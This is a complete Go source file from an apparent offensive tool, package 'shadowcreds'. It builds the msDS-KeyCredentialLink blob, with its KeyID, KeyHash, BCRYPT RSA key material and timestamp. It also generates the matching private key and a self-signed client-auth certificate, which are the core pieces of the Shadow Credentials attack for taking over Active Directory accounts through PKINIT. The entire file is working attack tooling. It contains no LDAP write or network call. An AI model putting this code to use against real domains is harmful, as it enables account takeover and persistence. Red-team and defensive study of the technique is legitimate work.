package shadowcreds

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/binary"
	"fmt"
	"math/big"
	"time"

	"github.com/google/uuid"
)

// KeyCredential represents the msDS-KeyCredentialLink structure
type KeyCredential struct {
	privateKey *rsa.PrivateKey
	publicKey  *rsa.PublicKey
	deviceID   uuid.UUID
	keyID      []byte
}

// NewKeyCredential generates a new RSA key pair and KeyCredential
func NewKeyCredential() (*KeyCredential, error) {
	// Generate 2048-bit RSA key
	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, fmt.Errorf("failed to generate RSA key: %w", err)
	}

	// Generate device ID
	deviceID, err := uuid.NewRandom()
	if err != nil {
		return nil, fmt.Errorf("failed to generate device ID: %w", err)
	}

	kc := &KeyCredential{
		privateKey: privateKey,
		publicKey:  &privateKey.PublicKey,
		deviceID:   deviceID,
	}

	// Compute KeyID (SHA256 of public key)
	pubKeyBytes, err := x509.MarshalPKIXPublicKey(kc.publicKey)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal public key: %w", err)
	}

	hash := sha256.Sum256(pubKeyBytes)
	kc.keyID = hash[:]

	return kc, nil
}

// BuildKeyCredentialBlob builds the binary KeyCredential structure
func (kc *KeyCredential) BuildKeyCredentialBlob() ([]byte, error) {
	// Build BCRYPT_RSAKEY_BLOB for RawKeyMaterial
	rawKeyMaterial, err := kc.buildRSAKeyBlob()
	if err != nil {
		return nil, err
	}

	// Compute KeyHash (SHA256 of all properties before KeyHash itself)
	properties := []property{
		{Type: 0x01, Value: kc.keyID},
		{Type: 0x03, Value: rawKeyMaterial},
		{Type: 0x04, Value: []byte{0x01}},
		{Type: 0x05, Value: []byte{0x00}},
		{Type: 0x06, Value: kc.deviceID[:]},
		{Type: 0x09, Value: fileTimeNow()},
	}

	keyHash := kc.calculateKeyHash(properties)

	allProperties := []property{
		{Type: 0x01, Value: kc.keyID},
		{Type: 0x02, Value: keyHash},
		{Type: 0x03, Value: rawKeyMaterial},
		{Type: 0x04, Value: []byte{0x01}},
		{Type: 0x05, Value: []byte{0x00}},
		{Type: 0x06, Value: kc.deviceID[:]},
		{Type: 0x09, Value: fileTimeNow()},
	}

	blob := make([]byte, 4)
	binary.LittleEndian.PutUint32(blob, 0x00000200)

	for _, prop := range allProperties {
		propBytes := prop.Marshal()
		blob = append(blob, propBytes...)
	}

	return blob, nil
}

// property represents a KeyCredential property
type property struct {
	Type  byte
	Value []byte
}

// Marshal marshals a property to bytes
func (p *property) Marshal() []byte {
	buf := make([]byte, 3+len(p.Value))
	binary.LittleEndian.PutUint16(buf[0:2], uint16(len(p.Value)))
	buf[2] = p.Type
	copy(buf[3:], p.Value)
	return buf
}

// buildRSAKeyBlob builds a BCRYPT_RSAKEY_BLOB
func (kc *KeyCredential) buildRSAKeyBlob() ([]byte, error) {
	pubKey := kc.publicKey

	expBytes := pubKey.E
	expBuf := make([]byte, 4)
	binary.BigEndian.PutUint32(expBuf, uint32(expBytes))
	for len(expBuf) > 1 && expBuf[0] == 0 {
		expBuf = expBuf[1:]
	}

	modBytes := pubKey.N.Bytes()

	blob := make([]byte, 24)
	binary.LittleEndian.PutUint32(blob[0:4], 0x31415352)
	binary.LittleEndian.PutUint32(blob[4:8], 2048)
	binary.LittleEndian.PutUint32(blob[8:12], uint32(len(expBuf)))
	binary.LittleEndian.PutUint32(blob[12:16], uint32(len(modBytes)))
	binary.LittleEndian.PutUint32(blob[16:20], 0)
	binary.LittleEndian.PutUint32(blob[20:24], 0)

	blob = append(blob, expBuf...)
	blob = append(blob, modBytes...)

	return blob, nil
}

// calculateKeyHash calculates SHA256 of serialized properties
func (kc *KeyCredential) calculateKeyHash(props []property) []byte {
	var data []byte
	for _, prop := range props {
		data = append(data, prop.Marshal()...)
	}
	hash := sha256.Sum256(data)
	return hash[:]
}

// fileTimeNow returns current time as Windows FILETIME (8 bytes)
func fileTimeNow() []byte {
	const ticksPerSecond = 10000000
	const epochDiff = 11644473600

	now := time.Now().Unix()
	filetime := (now + epochDiff) * ticksPerSecond

	buf := make([]byte, 8)
	binary.LittleEndian.PutUint64(buf, uint64(filetime))
	return buf
}

// GenerateCertificate generates a self-signed X.509 certificate
func (kc *KeyCredential) GenerateCertificate(cn string) (*x509.Certificate, error) {
	template := &x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject: pkix.Name{
			CommonName: cn,
		},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth},
		BasicConstraintsValid: true,
	}

	certBytes, err := x509.CreateCertificate(rand.Reader, template, template, kc.publicKey, kc.privateKey)
	if err != nil {
		return nil, fmt.Errorf("failed to create certificate: %w", err)
	}

	cert, err := x509.ParseCertificate(certBytes)
	if err != nil {
		return nil, fmt.Errorf("failed to parse certificate: %w", err)
	}

	return cert, nil
}

// PrivateKey returns the RSA private key
func (kc *KeyCredential) PrivateKey() *rsa.PrivateKey {
	return kc.privateKey
}
